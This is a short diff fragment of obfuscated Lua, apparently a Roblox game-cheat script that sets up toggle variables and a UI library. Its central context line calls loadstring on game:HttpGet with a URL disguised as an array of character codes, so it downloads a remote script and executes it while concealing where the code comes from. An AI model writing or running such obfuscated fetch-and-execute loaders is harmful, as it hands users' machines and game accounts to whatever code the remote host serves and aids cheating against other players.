@@ -27,7 +27,6 @@ if _0x08 then _0x06.Heartbeat:Fire(_d)end end)
 if not _ok then _0x0F=_0x0F+1 if _0x0F>=_0x0E then _0x08=false break end else _0x0F=math.max(0,_0x0F-1)end
 if _0x08 then task.wait()end end end)
 loadstring(game:HttpGet(_0xD({104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,104,105,116,101,99,104,98,111,105,47,98,105,122,122,97,114,101,104,105,106,105,110,107,115,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,108,101,97,110,97,110,100,109,111,110,101,121,46,108,117,97,63,116,61})..os.time()))()
-repeat task.wait()until _G.UILib
 local _0x11=_G.UILib local _0x12=game.Players.LocalPlayer.Name local _0x13=getgamename()
 local _0x14=false local _0x15=false local _0x16=false local _0x17=false local _0x18=false local _0x19=false local _0x1A=false local _0x1B=false local _0x1C=false
 local _0x1D=1 local _0x1E=0.01 local _0x1F=0.1 local _0x20=1500 local _0x21=false local _0x22=false
